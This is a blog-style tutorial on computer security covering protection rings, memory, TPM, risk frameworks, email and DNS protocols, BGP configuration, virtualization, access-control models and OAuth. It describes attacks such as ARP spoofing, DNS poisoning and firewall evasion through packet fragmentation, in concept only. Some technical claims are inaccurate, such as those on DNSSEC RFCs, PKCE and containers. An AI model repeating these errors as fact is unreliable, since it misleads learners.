# Security of Computer Systems
### A working tour from the ring model and memory to network protocols, access control, and the modern web attacks that target them

*Maksim Tcvetkov · 9 January 2023*

## Device security

There are three key elements in the security of computer systems:

- The **reference monitor** is responsible for granting subjects access to objects. It's abstract, and exists purely at the level of a concept.
- The **security kernel**: the physical and electronic elements that, at the technical level, make the reference monitor actually run.
- **TCB**: contains many components, the security kernel among them.

In the Russian-language literature you'll sometimes find the reference monitor called the security kernel or the access-control mechanism (the "guard"). The TCB (Trusted Computing Base) and the Reference Monitor are the foundation of information security for a physical computer — they're about managing every request to use the hardware's resources. The TCB controls access to the computer's resources: the hardware and operating-system components, including the reference monitor itself, the file system, and OS authentication. A superuser has access to all of the above, which is exactly why the amount of software requiring superuser-level rights should be kept to a minimum. Since the reference monitor is an abstract concept, it can be implemented in hardware, built into the OS or the OS kernel, or built into a user application — an SQL engine, say. The **loosely-coupled, highly-cohesive** principle holds that in the reference-monitor model, tightly related elements of the system should rarely interact with, or depend on, other modules.

Any process is always associated with a user. A process is the concept used to encapsulate all the information needed to run a program. When a subject (users, groups, roles, or cryptographic keys) requests access to a computer's resources, a check runs on whether access to the object can be granted. This is the so-called system call — the way a computer program requests a particular service from the OS kernel. The monitor's subjects are active entities, such as processes or threads, that gain access to resources. The core principle of such a monitor is that its entities represent users. The reference monitor sits as part of the interface between user space and the OS — this is how it works in every modern OS, Windows and Linux included. Many people know the concept of a "sandbox": a program (Java, say) executing inside an environment controlled by the reference monitor.

Hardware has different privilege levels; Intel x86 supports four of them. We call them rings, numbered from zero, where 0 is the system level and 3 is the level of user applications. Unix uses only rings 0 and 3, meaning only two levels are implemented in practice.

Each ring serves a distinct purpose:

- **Ring 0** is the OS's home base — the privilege level with the highest rights, needed for memory management.
- **Ring 1** covers input/output and OS components such as hardware drivers (the programs that talk to the OS so your mouse, keyboard, and network card actually work).
- **Ring 2** covers higher-level OS structures and services, like the network stack or the file system.
- **Ring 3** is home to user-level applications — a web browser, image-editing software, spreadsheets — software that isn't part of the OS's own operation. Ring 3 holds the least-trusted programs, which is exactly why they run with the lowest privilege levels.

Since we've touched on memory at ring 0, let's go into it in more detail. RAM can both read and write, which obviously means it isn't built for data integrity or confidentiality. ROM is read-only, which makes it perfectly suited to holding the OS. EPROM can have its data erased, which makes it a fit for storing cryptographic keys. WROM is write-once, as on CD-R discs.

Two terms worth knowing before diving into memory work: paging and segmentation. **Paging** is a virtual-memory management scheme that splits physical memory into fixed-size blocks (pages or frames), 4KB being typical. Paging is transparent to the application program: when a program loads into memory, it's split into pages of the same fixed size, just as physical memory itself is divided into pages/frames.

**Segmentation** is a different memory-management scheme that splits programs into variable-size blocks (segments). Segmentation, unlike paging, is visible to the application. Each program segment loads into a contiguous block of physical memory, meaning physical memory is divided into blocks of varying sizes. Each segment is tied to a semantic unit of the program (code, data, libraries, and so on).

Computers have exceptions — synchronous signals that arise when an abnormal event occurs in your program, such as division by zero or an attempt to access an invalid memory region. Exceptions are handled by the OS after the processor detects them, and every exception type carries an identifier (a "vector") and a corresponding handler.

**Virtual memory**: virtual addresses let memory be allocated relative to different tasks. The system translates these logical addresses, used by the application and stored in virtual memory, into a page of physical memory (an absolute memory allocation) right before execution. Memory has several tiers. The lowest is the CPU register, with cache layered on top of it as an intermediary between the register and primary memory, and the highest tier is your hard drive — the higher the tier, the longer memory access takes. On a 64-bit system, the registers start with RAX and can hold 64 different 1s or 0s; in a computer you'll see it written as, say, `rax: 0x00000000000008e7`. EAX (32 bits) sits inside RAX, and AX (16 bits) sits inside EAX, down to AL (8 bits).

Let's walk through this in a little more detail: your computer has a program installed with its own icon on the desktop. That program lives on secondary storage — the hard drive. When you double-click the icon to launch it, primary memory (RAM) activates and the program is loaded into RAM. Then the CPU takes over, processing the information from memory. Modern CPUs have many cores, which lets them run many processes at once, and the GHz figure describes how many instructions the CPU can process per second.

Chipsets can operate effectively without the knowledge of the firmware, the OS, or the hypervisor. As far as I know, it's impossible to spoof any component lower-level than this, since it's already as close to "bare metal" as it gets — these are the negative-numbered rings, where ring -3 is the chipset sitting on the CPU. That's exactly why detecting rootkits at ring -3 is so difficult. Another relevant piece is the **IVT** (Interrupt Vector Table), which stores each entry — the so-called interrupt vector — in main memory and manages the flow of execution. Interrupts are signals raised by hardware or software when a process or action needs immediate attention; they're asynchronous, meaning they can occur at any time. Keyboards and mice need instant access to the computer when they're used, which is why they rely on interrupts — the system needs to talk to an external device that operates out of sync with the CPU. These are asynchronous operations: we can press a mouse button at any moment, and it will register.

The difference between virtual and physical memory: a physical address is a fixed location in the computer's physical memory. A compiled program internally references memory cells using a virtual address, which the machine translates into a physical memory address at runtime.

Using virtual memory management carries a lot of advantages: it lets a program load into any location in the machine's physical memory without recompiling. Also, a program doesn't need to load into a contiguous block of physical memory — paging allows non-contiguous memory use, easing memory-fragmentation problems. When memory is limited, virtual memory management lets only parts of a program load into physical memory, which lets a process run on a system with less memory than the process technically requires. It also lets processes be separated by security level through the memory-management system.

There are two distinct ways of dividing up virtual address space: fixed-size blocks (pages) or logical blocks (segments). If memory is used incorrectly, an attacker can carry out a **stack smashing** attack — the buffer overflows, and some program gains access to a memory region it shouldn't have access to. Another popular attack is **arc injection**, which hands control to some code already sitting in memory. The **TOCTOU** attack (time-of-check-to-time-of-use) is when several programs access the same data, and a malicious program tries to alter that data after it's been checked but before it's used — a race-condition attack, and the fix is straightforward: atomic operations. All of this adds up to quite an extensive **attack surface** — a fair number of entry points available to an attacker.

The fact that paging is transparent to applications is both an advantage and a drawback: the advantage of transparency is the absence of overhead, but the drawback is that paging can't be used to enforce policy. Likewise, the fact that segmentation is *not* transparent is both a drawback (it places the bookkeeping burden on the application) and an advantage (it lets different segments serve different purposes and be considered separately from a security-policy standpoint).

Both schemes carry fragmentation overhead. Paging leads to internal fragmentation, where some fixed-size pages aren't fully used. Segmentation leads to external fragmentation, where varying segment sizes mean some regions of address space can't be allocated to a segment. Modern architectures and operating systems use a combination of the two — segmentation with paging (i.e., paged segmentation).

If persistent memory is used, it holds information even without power to the device — which, potentially, could also be stolen. So the physical device needs additional protection against physical tampering, such as a light sensor that triggers automatic data deletion.

Another vulnerable piece of hardware is **system management mode (SMM)**, which runs on the x86 architecture and is responsible for cooling, handling memory errors, and so on; rootkits can attack SMM through SMRAM (System Management RAM). Rootkits are software, usually malicious, designed to grant access to a computer system while masking its own existence from the OS.

Another useful piece of hardware in a computer is the **TPM**, whose standard in the crypto-processor world is ISO/IEC 11889:2015. A TPM is hardware purpose-built to serve as a new root of trust, often used to support cryptography-related computation. Secrets themselves are stored on a Secure Element (SE). A TPM consists of a random-number generator, cryptographic key generation, and the ability to verify those keys. **TEEs** are chipset areas for sensitive computation, but they aren't physically isolated from the rest of the chip — a Trusted Execution Environment works similarly to a TPM but isn't isolated from the rest of the chipset, and has its own dedicated memory, processor resources, and I/O; examples include ARM, AMD, IBM, Intel (SGX), and RISC-V.

The most reliable is a discrete TPM, used in critical systems. An integrated TPM is used in less critical systems, though it's still quite reliable. There's TPM 2.0, and Windows developers expect a system to have TPM 2.0 installed — any system without it falls outside what Windows supports. Installing Windows 11 requires TPM 2.0 present and enabled in the BIOS; if you lack this crypto-processor, PC Health Check will return the error "This PC can't run Windows 11," and you won't be able to install it.

## Risk assessment

During development, you have to stick to some basic principles — security should be proactive and preventive. In an interface, for instance, the default settings should provide a high level of security, and the product itself should meet the requirements and recommendations of GDPR, PMRM, NIST, and MITRE. A security assessment is simply a means for determining how successfully the object of the assessment (a person, an organization, a network) is achieving its security goals.

To pick the right "means," keep the typical linear attack process in mind:

1. Reconnaissance
2. Weaponization
3. Delivery
4. Exploitation
5. Installation
6. Command and control
7. Actions on objectives

And if you assume the default "means" is CAPEC, you're probably wrong. MITRE notes that CAPEC should be used for:

- modeling threats against applications
- training and coaching developers
- penetration testing

CAPEC isn't the only option, either — there's ATT&CK as well. MITRE notes that ATT&CK should be used for:

- comparing network-defense capabilities
- defending against modern advanced persistent threats
- hunting new threats
- improving threat intelligence
- adversary-emulation exercises

Next, we describe the potential risk using DREAD — each criterion capturing a distinct facet of the risk: Damage, the severity of the attack's consequences; Reproducibility, how difficult the attack is to reproduce; Exploitability, how difficult the attack is to actually carry out; Affected Users, how many people would be affected; and Discoverability, how easily the threat can be found. Each factor is scored from 0 to 10, and DREAD = (damage + reproducibility + exploitability + affected users + discoverability) / 5.

And we note the potential type of attacker:

- Attackers engaged in industrial espionage, aiming to sell a company's secrets
- Script kiddies
- Malicious hacking groups
- Nation-states
- Hacktivists
- (Cyber-)terrorists
- Advanced persistent threats
- Organized crime

We think through how we'll respond to threats:

- **Proactively**: efforts made before an incident occurs. This includes having security policies, patches, memory protection (through memory management), user authentication, and access control. If a user sees an Adobe Acrobat or Skype icon, they should be able to trust that it's a genuinely legitimate program rather than a virus. A file called "update.exe" should raise suspicion even in the office cleaner. Slightly more experienced users should understand what a supply-chain attack is and download installers for Chrome, Windows Update, Zoom, and the like with real care — and if they see CloudFront or FileHippo instead of the real vendor, close the tab immediately.
- **In real time**: efforts to establish and maintain security — cutting off security violations at the exact moment they're about to happen (a firewall, an intrusion-detection system, antivirus software like ClamAV).
- **Reactively**: efforts to detect and respond to security violations after they've already occurred — antivirus scanning, or incident response by dedicated cybersecurity teams.

Anderson also identified three types of security violation, which underpin the CIA triad:

1. Unauthorized disclosure of information (confidentiality)
2. Unauthorized modification of information (integrity)
3. Unauthorized denial of use (availability)

As the set of frameworks above shows, there are countless ways to classify almost anything — CERT-RMM being a vivid example. You can bury yourself in this and spend thousands of working hours documenting everything under the sun. But the business usually wants resilience from us, and that isn't the same thing as risk management — it's a broader concept that includes business continuity, monitoring included. First and foremost, though, it's about backups, uninterrupted power supply, the company's ability to keep functioning without temporary IT access, and an understanding of how interdependent the services are.

To pick the right items from the list above for your case, you need to understand the type of organization you're in. Critical infrastructure needs protection from natural events, which can't be handled reactively. Protecting the electrical grid, for instance, starts with protecting the generators: if the supply frequency is too low or too high, a generator has to disconnect from the grid automatically, to avoid equipment damage. If there isn't enough electricity, priority has to go to hospitals, nuclear reactors, the metro, and other critical city infrastructure. And if the current is too high, a protective relay has to trip, break the line, and prevent damage to equipment on either side. Chemical plants, similarly, rely on the IEC 61511 standard and Distributed Control Systems (DCSs).

There's a separate class of devices, Cyber-Physical Systems (CPS), that need special protection. Stuxnet, for instance, could manipulate PLCs, and was aimed at the Iranian nuclear program — causing incorrect motor rotation speeds and, as a result, preventing the uranium-enrichment process from being properly calibrated. This is already brushing up against the concept of military conflict.

This kind of critical-infrastructure territory raises a question about a device's own architecture worth answering here, since it comes up whenever you're building anything with real backend demands — an IoT product included. If you're building something small, just testing the market, the reasonable starting point is one central server providing data access to every device on the network. This centralized-network approach is easy to build, easy to maintain, and always internally consistent, since there's only one server. But it can't scale horizontally, only vertically — beyond piling more memory, cooling, and ports onto the server, or moving it into a room with precision air conditioning, there isn't much left to do for performance, and the performance ceiling is reached very quickly. There's also elevated downtime risk: the server breaks, and everything breaks with it. Centralized networks carry more security risk too, since they're very easy to DDoS, and if the server is breached, all the data leaks at once.

The more mature approach is building a decentralized network — several servers splitting the load. The servers don't depend on each other, which means higher scalability and flexibility: each server can be scaled vertically, or you can scale horizontally by adding more servers, which is often cheaper and more performant than buying expensive components. On the security side, different servers hold different information, so stealing everything becomes far harder. But decentralized networks are harder to maintain, and coordination problems do arise. An improved version of the decentralized network is the distributed network, sharing similar strengths and weaknesses; these networks have an end node (thin clients, or IoT devices), intermediate devices (routers, switches), and a network medium (cables and the like carrying the data).

One obvious way to reduce the chance of a breach is full isolation from the internet, with data diodes inside. Since much of the hardware in critical infrastructure is old and unpatched, bump-in-the-wire devices are needed to provide integrity, authentication, and confidentiality for network packets. For wireless networks there's the wireless shield, which jams anything unsafe or unauthorized. None of this removes the need to actually test security.

Security testing comes in different forms. An audit, for instance, evaluates the system's rules. Or you hire an external red team and commission black-box, gray-box, or white-box testing, which in practice just describes how much information they start the test with. And don't forget the official methodologies — NIST, OWASP.

In typical practice, every Windows update is critically important, since it patches vulnerabilities — but it's also a potential source of new ones. Yes, installing an update is a bit of a lottery. There's a solution, though: if you have plenty of compute, build a test group of Windows devices running similar services and roll updates out to that small group first. Short on resources? Search online for the update's KB number, take backups, and install the second-to-latest update — there's no trouble uninstalling an update these days. Or configure updates flexibly with PDQ Deploy. That way you can cut down on how much security testing is needed.

For a related, practical question — checking what software on a Windows machine hasn't been updated — a convenient PowerShell command is `(New-Object -ComObject Microsoft.Update.Session).CreateupdateSearcher().Search("IsHidden=0 and IsInstalled=0").Updates | Select-Object Title`, which lists the pending updates. For the full list of installed x64 programs, `Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*` works, or the more readable `Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, Publisher, Version, InstallDate`.

If you have in-house development, you need to test your own product for vulnerabilities. Testing a finished product can be product-oriented or process-oriented. The first is about testing the product itself, which can give different results depending on many conditions — not always great from a sales perspective, since different antivirus products, for instance, show different results across different tests. Regardless, any check should cover functionality, effectiveness, and the thoroughness of the check itself. The relevant standard right now is Common Criteria (CC) evaluation. As an example, consider the seven Evaluation Assurance Levels for OS security:

- **EAL 1** — minimal evaluation cost; the evaluation is based on the product's documented functions.
- **EAL 2** — the vendor supplies documentation and vulnerability-analysis test results; the tester reproduces similar tests based on the documentation.
- **EAL 3** — from a developer who already follows sound software-design practices from a security standpoint; configuration and high-level software design are considered.
- **EAL 4** — low-level design, source code, and process are studied. RedHat meets EAL 4, though this isn't a strict requirement.
- **EAL 5** — a rigorous development approach.
- **EAL 6** — all code should be readable and well-structured, and a serious pentest is expected. Astra Linux Special Edition meets EAL 6, with a submission pending for EAL 7.
- **EAL 7** — the developer has to confirm that every security function works exactly as intended. Testing here is complex and lengthy.

## Network protocols

The first thing worth understanding is that bare knowledge of protocols, without hands-on skill with specific hardware, has little value — but you can't get anywhere without the theory either. So let's talk about email as a popular attack target. Broadly, a message's path from sender to recipient looks like this: `Sender -> MUA -> MSA -> MTA -> MDA -> MUA -> recipient`. The standard protocol for transmitting email is SMTP over TCP on port 25; for receiving, the protocols are POP3, IMAP, and MAPI. These protocols often don't account for authentication at all. The absence of confidentiality, privacy, integrity, and availability, plus the presence of spam — these are email's core problems. For confidentiality you'd want end-to-end encryption, but the sender needs to know the recipient's encryption key before encrypting, which isn't available out of the box — keys have to be exchanged in advance. S/MIME and PGP solve the problem, but they're far from universally used. For signing keys, I'd lean toward x509v3 over PGP. Or a simpler fix: use TLS from the sender to the MTA/MSA for protection, and DNSSEC helps on the leg from MSA to DNS. And for receiving the message from the MDA, TLS again (the transport-layer protocol needed for authentication, data integrity, and confidentiality).

![Email path from sender to recipient](https://your-scorpion.ru/wp-content/uploads/2023/02/Artboard.png)

The MUA in the diagram represents the user — meaning, of course, the program where the "Send" button gets clicked. The MTA is the router forwarding the message closer to the recipient. S/MIME handles SHA-256 authentication, confidentiality, and compression.

As for PGP, it has a fundamental architectural problem in its key servers — here's the [full list of issues](https://www.cvedetails.com/vulnerability-list/vendor_id-462/PGP.html). But for email you can use a product like Proton Mail and layer PGP on top of it, since that's exactly what it was designed for. Simpler still: negotiate a shared key via the DH protocol, then encrypt and send by mail.

Now let's talk about SMTP, which is structured around only three steps. Everything starts with a MAIL command, which states the sender's identifier; then a series of one or more RCPT commands, giving information about the recipient; then a DATA command, which transmits the mail data; and finally, an indicator marking the end of the mail data confirms the transaction. This lack of built-in sender authentication in the command sequence itself is exactly why forging a sender address is so trivial in principle — and it's precisely why the layered defenses discussed above (S/MIME, PGP, TLS, DNSSEC) exist as bolt-ons rather than something SMTP handles natively. RFC 822 and MIME define the structure of an email message the way HTML defines how a web page is built. SMTP has many variations — STARTTLS, for instance, which adds confidentiality and authentication. SMTP on its own can't transmit files and is limited to 7-bit ASCII.

RFC 822 tells us that a message can have a body and a header in ASCII encoding. For a message to handle not just text but files, MIME is used — it defines data types like `image/gif` or `image/jpeg`, and every one of these can also carry PHP code, which antivirus products still detect poorly. Plain text can also become `text/richtext`. But MIME still only works with ASCII and encodes into base64. Message transmission runs on SMTP, but you'll still encounter IMAP and POP; the former, like SMTP, sends the message over TCP to the mail server. S/MIME also reduces the message's weight.

On a related, purely defensive note: since a forged "From" header is often all it takes to make a message look legitimate, one complementary practice worth knowing is checking the public footprint of an email address you've received mail from — confirming whether it's a real, established identity rather than a freshly spun-up throwaway. A tool like [holehe](https://github.com/megadose/holehe) checks which online services an email address is registered on; if the address has been used to create accounts across various social networks, that's a signal the identity behind it is more established, which is useful context when judging whether a message deserves your trust.

**DNS.** Almost everything on the internet depends on DNS, which returns the right number for the right query. To stop bad actors from tampering with the transaction identifier, the protocol adds a "random" number from 0 to 65535. The real name server knows this number because it was included in the query; the attacker doesn't, and at best can only guess. TTL is applied here, though TTL isn't a security feature. If an attacker tries responding with a random number not once but a hundred times, their odds of success shift from 65536-to-1 down to 655-to-1. And the attacker's arsenal still includes cache poisoning, QID guessing, and much more. DNS is also vulnerable to poorly configured router ACLs. Theoretically, though, DNS poisoning shouldn't matter, since everything important is protected by SSL. PowerDNS is worth having in your toolkit.

Let's practice a little with DNS. Almost every computer has the built-in `nslookup` command. Typing `nslookup`, then `set type=MX`, then `targetsite.com`, in sequence gets you the MX records (Mail Exchange) — the mail servers. Debugging is enabled with `set debug`, and `set type=any` sets the query type to "any," letting DNS return records of every type. Now you can type any address, say `http://www.mhss.gov.na/`.

![nslookup output](https://your-scorpion.ru/wp-content/uploads/2023/02/Untitled-1-1.png)

In fact, an address like www.example.edu.com is read right to left, since `.com` sits highest in the hierarchy; ICANN is responsible for that zone.

A record on the server would look something like this:

```
(princeton.edu, dns.princeton.edu, NS, IN)
(dns.princeton.edu, 128.112.129.15, A, IN)
```

What is a URL actually made of? There are three different levels of identifier — domain names, IP addresses, and physical network addresses. Converting identifiers at one level into identifiers at another happens at different points in the network architecture. First, users specify domain names when interacting with an application — typing a site address into the browser bar. Second, the application uses DNS to translate that name into an IP address; every datagram carries the IP address, not the domain name — the domain name exists purely for humans. Third, IP-address forwarding happens at every router, which often means translating one IP address into another — translating the address of the final recipient into the address of the next router. Finally, IP uses the Address Resolution Protocol (ARP) to translate the next hop's IP address into that machine's physical address. ARP is also used to identify hosts on a network by sending requests across the local network, asking hosts with certain IP addresses to respond with their MAC address. The next hop can be the final destination or an intermediate router.

Along this remarkable path, ARP spoofing can occur — an attack in which the attacker gains full control over IP traffic on a particular data link. The ARP protocol doesn't verify the authenticity of received requests and responses, and caches them regardless. You'll sometimes see the view that SPF lets you publish addresses and protect yourself from an attacker, but if an attacker can interfere with TCP itself, SPF won't help either — SPF simply flags the wrong IPs. DKIM, a protocol for signing messages, will partially help against spoofing.

**DNSSEC**-bis, per RFC 1912, is best practice for DNS administrators. DNSSEC's core goal is letting the recipient of a DNS message verify its contents — in essence, a digital signature is added to the DNS message, which solves the problem of distributing a secret key.

Packets can, and should, be fragmented into smaller pieces. RFC 791 allows fragmented packets to be sent and reassembled at the destination based on their listed offsets. This lets you get around certain firewalls, by hiding TCP flags in the packet at offset 1 and dropping them entirely at offset 0. Packet-filtering firewalls have limited memory, so they can only cache a fixed number of offsets before running out — IP datagrams have to be reassembled before moving up the stack.

The first command might look like this, and the response should be `250 OK` or `550 Failure`:

```
MAIL <SP> FROM:<reverse-path> <CRLF>
RCPT <SP> TO:<forward-path> <CRLF>
DATA <CRLF>
```

Another useful command is `server`, as in `server 193.63.81.33`. And if you want to dig into DNSSEC, a service like [dnssec-analyzer.verisignlabs.com](https://dnssec-analyzer.verisignlabs.com/) is a good fit.

PPP is used for direct communication between routers, with no intermediary; it was also used to provide dial-up internet access. PPPoE runs over the internet, and ATM PPPoE supports internet connections over DSL.

MPLS (MultiProtocol Label Switching) adds a header to every packet, and further routing runs off that header rather than the IP address; MPLS sits somewhere between IP and PPP.

One of the authentication protocols is PAP. PAP works very primitively — it sends a login and password to the server and gets a response. It usually runs alongside PPP or PPPoE for DSL, but it's quite vulnerable, and CHAP is the better choice. CHAP supports a three-step handshake, but it isn't secure on its own either, since there's no encryption — a login can be intercepted and an offline dictionary attack launched against it. MS-CHAP versions 1 and 2 are vulnerable to L0phtCrack.

The DANE protocol lets X.509 certificates be associated with DNS through DNSSEC; DANE also works with a new DNS record type, TLSA.

**Other interesting protocols:**

UDP is a simple protocol for datagram delivery — the UDP datagram header includes a checksum, letting the recipient detect accidental data corruption. If ports 67 and 68 are blocked on DHCP, or DNS on port 53 with TCP blocked, it's often enough to restart DHCP, DNS, and NTP. Additional features like acknowledgment can be provided by upper layers — this is what streaming and gaming rely on. L2TP also runs over UDP and is used for PPP sessions; it offers no security on its own, but L2TP can be carried over IPsec. UDP is an excellent foundation for RPC — remote procedure calls.

DHCP hands out IP addresses. Every device on a network needs a unique IP address, automatically assigned via DHCP, and every network should have its own DHCP server. This is message forwarding, and OSPF can be used for the actual routing — the most popular routing protocol for IPv4, IPv6, and CIDR on the internet.

Protocols can be internal or external by type of use: RIP and OSPF internally, BGP externally. They can also be divided into distance-vector (RIP), path-vector (BGP), link-state (OSPF), and hybrid, by their operating principle.

An example BGP setup: say we have six routers, and each router announces its local network over BGP.

| Router name | AS | Local IP network | Connected to (neighbor) |
| --- | --- | --- | --- |
| a | 10 | 10.99.10.0/24 | b,c |
| b | 11 | 10.99.11.0/24 | a,c,d |
| c | 12 | 10.99.12.0/24 | a,b,d,e |
| d | 13 | 10.99.13.0/24 | b,c,e,f |
| e | 14 | 10.99.14.0/24 | c,d,f |
| f | 15 | 10.99.15.0/24 | d,e |

Looking at the VyOS operating system, it can work in two modes. The first, which you land in right after logging in, is the operational mode. Three simple commands:

```
show interfaces
show ip route
show bgp ipv4
```

![VyOS interface and routing output](https://your-scorpion.ru/wp-content/uploads/2023/02/Group-33139.png)

These commands print all the network interfaces, the current system's routing table, and the system's BGP routing table.

Time to send network packets and watch them run between the routers. The command for this is `ping 10.99.15.1 source-address 10.99.10.1 &`, which continuously sends packets from IP 10.99.10.1 to 10.99.15.1, with the receiving side responding with packets from 10.99.15.1 to 10.99.10.1. After that you'll need `tcpdump` to display details of the packets sent — a kind of analog to Wireshark, Azure Network Watcher, ManageEngine OpManager, or SolarWinds NetFlow Traffic Analyzer. First, `ifconfig -a|less` will show the interface names, then `tcpdump -c40 -i eth0` displays the first 40 packets, letting you see which packets fly past a proxy — timestamp, source IP and port, and the destination IP and port too.

Next, use the `configure` command to enter configuration mode, and type:

```
set protocols static route 10.99.14.0/24 next-hop 10.0.3.13
set protocols bgp address-family ipv4-unicast network 10.99.14.0/24
commit
exit
```

This sets up packet forwarding from router a to router b — even though it won't be the ideal configuration from a networking standpoint. All told, you'll definitely need to know the Linux commands `ip`, `ip link`, `ip address`, `ip route`, `ping`, `ifconfig`, and `route`.

![Linux networking commands](https://your-scorpion.ru/wp-content/uploads/2024/03/36363.png)

**OSPF** works out the weight — how costly a given route is for delivering a packet of data.

**RADIUS** is an application-level protocol needed for user authentication and authorization.

**VXLAN** is for scaling large cloud deployments.

**User Authentication Protocol**: authenticating a user against a server.

**Kerberos 5** — version 4 differs substantially from version 5, and consists of six messages. It provides a centralized authentication server; it's a protocol for authentication and subsequent authorization.

- First, the user sends an unencrypted request to the server, asking for access to some service.
- The authentication server validates the request and generates a TGT.
- The TGT is sent back to the user, along with a secret key.
- The user decrypts the server's message and sends a new message to a new server, the TGS (Ticket Granting Server), which generates an ST.
- The message from the TGS flies back to the user's side and, after that, on to the target server.
- The message from the target server is sent to the user, and at this point everyone has the session keys.

## Virtualization

Virtualization is when several different OS instances run on one device. Emulation, by contrast, simulates a hardware architecture, which means viruses designed to attack the hardware simply won't work. Containerization lets one piece of software keep its resources completely separate from other software, logic that's somewhat similar to browser tabs. A typical architecture looks something like this: user applications > algorithms > programming languages > operating systems > firmware > microarchitecture > RTL (Register Transfer Level, SystemVerilog-level behavior) > gate level > transistors.

Virtualization reproduces a full computer, all its devices included. Service-level virtualization is when a web server provides resources to several web applications. At the OS level, virtualization provides resources to several operating systems. Containers, meanwhile, live within a single OS, but share the same kernel. Network containers provide network infrastructure — a well-known example is a VLAN. Containers are lighter than virtual machines, while CPU virtualization lets you get many small CPUs for different tasks.

Emulation imitates different hardware and needs an interpreter to run code meant for a different hardware architecture. Virtualization assumes the same type of hardware the software runs on natively (meaning no interpretation is needed) — in other words, virtualization lets us work with different OSes simultaneously on the same hardware. Containerization lets one OS keep applications isolated from one another without sharing library resources.

Containerization also makes your web application portable. The technology packages an application together with its accompanying libraries, config files, and supporting dependencies into a single software package (a container). The container doesn't depend on the host OS, letting it run on practically any platform.

A hypervisor lets you create an OS within an OS — that's exactly how VirtualBox, VMware, and QEMU work. But if the hypervisor is attacked, every installed OS is under threat too.

![Type 1 virtualization](https://your-scorpion.ru/wp-content/uploads/2023/01/Screen-Shot-2023-01-31-at-12.20.17-PM.png)

*Type 1 virtualization*

![Type 2 virtualization](https://your-scorpion.ru/wp-content/uploads/2023/01/Screen-Shot-2023-01-31-at-12.18.20-PM.png)

*Type 2 virtualization*

## Access control

I divide access control into three approaches: access control matrices, capabilities, and access control lists.

**Access control matrices:**

- Determining authorized access at runtime: simple — just find the corresponding entry in the table, except the table can be very large, so finding the entry may mean reading a lot of data.
- Adding access for a new principal: not so simple — a new row has to be created and filled in the matrix.
- Removing all access for a principal: relatively simple, since it just means deleting a row in the access-control matrix.
- Determining every principal with access to a given object: relatively simple, since it involves checking the corresponding column of the matrix.
- Creating a new object that all principals can access by default: relatively simple, since it just means creating a column in the access-control matrix with every entry "positive."

**Capabilities** (i.e., a list per principal specifying the objects they can access, corresponding to a row of the access-control matrix):

- Determining authorized access at runtime: simple, since only one set of capabilities needs examining (the relevant principal's).
- Adding access for a new principal: simple, as above.
- Removing a principal's access: simple, as above.
- Determining every principal with access to a given object: not simple (possibly infeasible), since every principal's full set of capabilities has to be checked.
- Creating a new object that all principals can access by default: not so simple, since every principal needs to be granted a new capability.

**Access control lists** (i.e., a list per object specifying the principals with access to it, corresponding to a column of the access-control matrix):

- Determining authorized access at runtime: reasonable, as long as accessing each object's ACL is simple.
- Adding access for a new principal: not simple, since every relevant object's ACL has to be modified.
- Removing a principal's access: not simple, since every object's ACL has to be checked and, where needed, modified.
- Determining every principal with access to a given object: simple — just check that object's ACL.
- Creating a new object that all principals can access by default: simple, as above.

Now let's talk fundamentals. Authentication is verifying whether there's a right to use a given resource, which requires identifying the person — via a secret question, a passport, biometrics. Authorization, by contrast, answers "what is this person allowed to do?" — it's about controlling access to protected resources. A user might be granted only blind write access to a file, for instance: permission to write to the file but no ability to read it. Authorization usually depends on user authentication and follows it. If user authentication is compromised, attackers can masquerade as other legitimate users and, in turn, gain access to a company's internal resources.

There are different concepts for rights management, conventionally split into mandatory and discretionary. A mandatory model is assumed to complement a discretionary one — the BIBA model, for instance: no write up, no read down. Or the Bell-LaPadula model (BLP): execute, read, append, write, but under no-write-down, no-read-up conditions. In the Bell-LaPadula model, formally, a Trojan horse can never steal classified data — the access level can be stored on both the subject and the object. BLP doesn't let users read information above their access level or write information below it, meaning a file can be read-only or write-only depending on the level involved. BLP is far from ideal, since declassification exists, breaking the access-control logic when handling an information flow in a distributed environment. Both models are impractical for real use, for the following reasons:

- **Static security levels.** The models don't account for changes in security levels — a person might in principle gain more or less access at some point, and the model has no way to reflect that change.
- **Mismatched dependencies.** A discretionary policy is tied to identity (where the access rights to a resource typically matter), while a mandatory policy is identity-independent (where the resource's own characteristics matter).
- **Incompatibility with each other.** BLP is a confidentiality model directly incompatible with the Biba model — they're inversions of one another.
- **Hard to apply**, since they assume honest, rational participants — they can't handle insider threats, collusion, or accidents.

The Clark-Wilson model is more practical. It formalizes the practice of separating duties, which relates to building simple systems (ones that don't do many things at once) — instead, functional responsibilities are split up. It's characterized by well-formed transactions and separation of duties:

1. The subject must be authenticated.
2. The object can only be manipulated by a limited set of programs.
3. The subject can only run a limited set of programs.
4. Action logs are required.

Or HRU (Harrison, Ruzzo, and Ullman) — there exist objects, subjects, and access rights.

Let's move to more practical ground. A fairly well-known method of authorization is OAuth 2.0, though it isn't about authentication. Say you're playing a game, and the app needs you to share your friends list from a social network — that's an OAuth use case. The browser window opens a form from the authorization service, requesting permissions from the user. The user consents to continue, and the server sends an authorization code to the client machine, which is then sent on to the server. Tokens fly back to the client, letting the services maintain a connection over a long period. OAuth 2.0's PKCE Implicit Grant isn't considered safe. If you're already using OAuth 2.0 and need to add authentication, look toward OpenID Connect. Also popular is the Device Authorization Grant — OAuth for IoT. Safe? No. Don't try writing your own version of OAuth from scratch — use ready-made libraries. An attacker can use CSRF as a popular attack type, and open redirect can also influence a request's URL; libraries handle this, whereas writing all the logic from scratch means you have to handle it yourself.

Before adding OAuth to your project, you have to register the application, providing a site, logo, app name, and redirect URL in a format like `demoapp://redirect`. After registering, you get a client ID and a secret (if you have a server); if there's no server, use PKCE. The first step is authorization — the user sees a popup requesting permission for the third-party app to connect to the account, and after confirmation there's a return to the original page with a URL like `https://app.com/cb?code=AUTH_CODE_HERE&state=1234zyx`. That's roughly how it works.

